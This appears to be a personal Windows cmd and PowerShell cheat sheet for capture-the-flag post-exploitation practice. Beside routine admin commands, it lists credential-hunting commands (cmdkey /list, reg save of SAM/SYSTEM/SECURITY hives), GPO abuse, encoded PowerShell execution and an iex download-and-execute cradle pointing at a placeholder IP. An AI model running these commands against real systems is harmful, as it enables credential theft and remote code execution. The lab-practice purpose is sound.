cmd.exe

Command Explain
hostname It returnes hostname, for instance, DC01, ERA,SECURA.
cmdkey /list Displays stored credentials in Windows Credential Manager (saved RDP, network share, web creds). Useful in post-exploit to find credentials the system will auto-use.
dir /a Show files with any attributes (includes hidden and system files). You can refine with flags like /a:h (hidden only) or /a:-h (exclude hidden).
dir /R Displays Alternate Data Streams (ADS) for NTFS files. NTFS files can have hidden extra streams that a normal dir does not show.
certutil -encode file output Base64-encodes file to output. Useful to safely copy binary/text via clipboard or text channels and reconstruct locally.
reg save filename outputfile_name reg save is a command that writes a registry hive (a registry file) out to disk as-is.
In other words, it's a tool to save part of the current Windows registry (for example HKLM\SAM, HKLM\SYSTEM, HKLM\SECURITY) to a file.
Get-Process | Where-Object { $_.ProcessName -eq "chrome" } Filter processes.
Get-Process | Where-Object { $_.ProcessName -notlike "*chrome*" } Filter partially matched name.
Get-Process | Where-Object { $_.ProcessName -ne "chrome" } Filter whole matched name.
tasklist /fi "imagename eq cmd.exe" List all running process.
where /R C:\ filename Searches recursively from C:\ for files matching filename and prints full paths. Equivalent to Linux find for a simple name search; runs in Windows Command Prompt.
schtasks /query /v /fo LIST | findstr /I "schedule.ps1" You can query schedule using schtask.

PowerShell

Command Explain
tree /f Display current directory structure like tree format.
ls -force List all folders/files even though they are hidden.
Get-Content "hm.txt" -Stream "root.txt" Reads the Alternate Data Stream named root.txt attached to hm.txt. Use when data may be hidden in an NTFS ADS.
gci -force Alias for Get-ChildItem -Force; lists items including hidden/system files in PowerShell.
gci env: See environment variable for the user. You may find AppKey.
Get-ChildItem -Path "C:\" -Filter "root.txt" -Recurse Searches C:\ for entries matching root.txt. -Filter is fast but not recursive by default (use -Recurse if needed).
Get-ChildItem -Path "C:\" -Include "*.txt" -File -Recurse Recursively finds all files under C:\ with the .txt extension; -File restricts results to files (no directories).
(Get-Command "C:\Program Files (x86)\...\something.exe").Version See exe application version
Get-ChildItem HKCU:\Software\Microsoft\Windows\CurrentVersion\Lxss Search HKCU's childitem.
Get-Gpo -Guid 1234...5678 You can see details for group policies.
Get-GPO -all Extract all gpo details
New-GPO -name "vulnerable one" Create gpo
New-GPLink -Name "vulnerable one" -target "DC=frizz,DC=htb" Add new link to the created gpo.
Gpupdate /force Update GPO with force flag
iex(new-object net.webclient).downloadstring('http://$IP/$FILE') downlaodstring downloads strings from the file, and iex evaluate it.
Invoke-WebRequest -URI "$URL" -OutFile file.extension File installation code.
Get-ACL filename Displays permission.
netstat -nto We can see processes.
tasklist /v /FI "PID eq PROCESS_ID" We can see details for process id.
get-process -Id PROCESS_ID Like above.
get-acl FILE_NAME | select-object Owner We can see file Owner.
powershell /enc BASE64 Acronym of -EncodedCommand
powershell -e BASE64 Acronym of -EncodedCommand
